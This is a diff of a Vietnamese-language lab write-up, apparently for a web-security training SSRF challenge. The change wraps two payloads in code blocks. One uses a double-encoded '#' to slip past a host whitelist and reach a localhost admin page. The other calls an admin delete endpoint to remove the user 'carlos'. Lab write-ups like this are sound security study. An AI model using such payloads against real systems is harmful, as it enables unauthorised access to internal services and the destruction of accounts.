@@ -14,7 +14,9 @@ Có vẻ như web bắt buộc chúng ta phải bắt đầu bằng ***stock.wel
 
 Cho đến khi test thử
 
+```markdown
 **stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin** (stockApi=http://localhost#@stock.weliketoshop.net/admin)
+```
 
 ![](/imgs/CSRF/15.png?raw=true)
 
@@ -27,7 +29,9 @@ Cho đến khi test thử
 
 Tiến hành xóa user carlos bằng
 
+```markdown
 **stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos**
+```
 
 ![](/imgs/CSRF/17.png?raw=true)
 
